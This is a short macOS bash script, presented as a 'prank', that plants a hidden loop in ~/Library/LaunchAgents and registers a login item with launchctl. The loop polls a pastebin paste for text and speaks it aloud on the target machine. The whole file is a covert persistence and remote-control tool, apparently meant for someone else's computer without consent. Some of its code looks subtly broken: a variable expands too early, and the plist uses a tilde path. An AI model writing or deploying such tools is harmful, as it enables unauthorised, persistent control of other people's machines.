#!/bin/bash

# TODO: set pastebin id for communication
pastebin_id=

create_prank_script() {
    mkdir -p ~/Library/LaunchAgents
    cat << EOF > ~/Library/LaunchAgents/prank.sh
#!/bin/bash
pastebin_id=$pastebin_id
while true; do
    text=\`curl -s "http://pastebin.com/raw.php?i=\$pastebin_id"\`
    if [[ "\$text" == "" ]]; then
        sleep 60;
    else
        say "$text";
        sleep 10;
    fi
done &
EOF
}

make_prank_script_executable() {
    chmod gou+x ~/Library/LaunchAgents/prank.sh
}

make_prank_persistent() {
    cat << EOF > ~/Library/LaunchAgents/com.user.loginscript.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.user.loginscript</string>
    <key>Program</key>
    <string>~/Library/LaunchAgents/prank.sh</string>
    <key>RunAtLoad</key>
    <true/>
  </dict>
</plist>
EOF
}

start_prank() {
    launchctl load ~/Library/LaunchAgents/com.user.loginscript.plist
}

main() {
    create_prank_script
    make_prank_script_executable
    make_prank_persistent
    start_prank
}

main

